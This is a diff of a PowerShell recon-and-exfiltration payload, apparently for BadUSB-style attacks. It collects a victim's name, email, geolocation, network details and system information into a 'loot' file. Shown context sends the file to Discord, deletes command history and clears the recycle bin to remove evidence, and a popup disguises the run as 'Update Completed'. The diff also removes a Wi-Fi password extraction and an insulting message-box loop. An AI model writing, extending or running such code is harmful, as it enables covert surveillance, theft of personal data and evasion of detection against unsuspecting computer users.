@@ -1,4 +1,13 @@
 
+                                                                                                                                                                                                                                               
+<#
+.SYNOPSIS
+	This is an advanced recon of a target PC and exfiltration of that data.
+.DESCRIPTION 
+	This program gathers details from target PC to include everything you could imagine from wifi passwords to PC specs to every process running.
+	All of the gather information is formatted neatly and output to a file.
+	That file is then exfiltrated to cloud storage via Dropbox.
+
 
 ############################################################################################################################################################
 
@@ -70,6 +79,43 @@ function Get-email {
 }
 
 $email = Get-email
+
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+function Get-GeoLocation{
+	try {
+	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
+	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
+	$GeoWatcher.Start() #Begin resolving current locaton
+
+	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+		Start-Sleep -Milliseconds 100 #Wait for discovery.
+	}  
+
+	if ($GeoWatcher.Permission -eq 'Denied'){
+		Write-Error 'Access Denied for Location Information'
+	} else {
+		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
+	}
+	}
+    # Write Error is just for troubleshooting
+    catch {Write-Error "No coordinates found" 
+    return "No Coordinates found"
+    -ErrorAction SilentlyContinue
+    } 
+
+}
+
+$GeoLocation = Get-GeoLocation
+
+$GeoLocation = $GeoLocation -split " "
+
+$Lat = $GeoLocation[0].Substring(11) -replace ".$"
+
+$Lon = $GeoLocation[1].Substring(10) -replace ".$"
+
+############################################################################################################################################################
 
 # local-user
 
@@ -233,8 +279,7 @@ $videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcess
 
 ############################################################################################################################################################
 
-$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} 
-| %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+# OUTPUTS RESULTS TO LOOT FILE
 
 $output = @"
 
@@ -276,10 +321,13 @@ $output = @"
 #                                           ⠀⠀⣰⡿⢁⡞⠀⠀⠀⣼⣿⣁⠀⠈⠉⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠐⠟⠁⠀⠔⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀                                                                                                                                                                                                                            
 ############################################################################################################################################################        
 
-
 Full Name: $fullName
 
 Email: $email
+
+GeoLocation:
+Latitude:  $Lat 
+Longitude: $Lon
 
 ------------------------------------------------------------------------------------------------------------------------------
 
@@ -308,8 +356,6 @@ $localIP
 MAC:
 $MAC
 
-WIFI Passwords:
-$wifiProfiles
 ------------------------------------------------------------------------------------------------------------------------------
 
 Computer Name:
@@ -510,28 +556,6 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 
 ############################################################################################################################################################
 
-Add-Type -AssemblyName System.Windows.Forms
-
-# The number of times you want it to cycle through your list of questions
-
-$cycles = 5
-
-# List as many questions here as you like, it will cycle through all of them
-
-$msgs = @(
-"How fucking dumb are you?"
-"That won't work :)"
-)
-
-for ($i=1; $i -le $cycles; $i++) {
-
-Foreach ($msg in $msgs) {
-[System.Windows.Forms.MessageBox]::Show($msg , "You're-a-Loser.exe" , 4 , 'Warning')
-}
-}
-
-############################################################################################################################################################
-
 <#
 .NOTES 
 	This is to clean up behind you and remove any evidence to prove you were there
@@ -553,3 +577,9 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
+		
+############################################################################################################################################################
+
+# Popup message to signal the payload is done
+
+$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
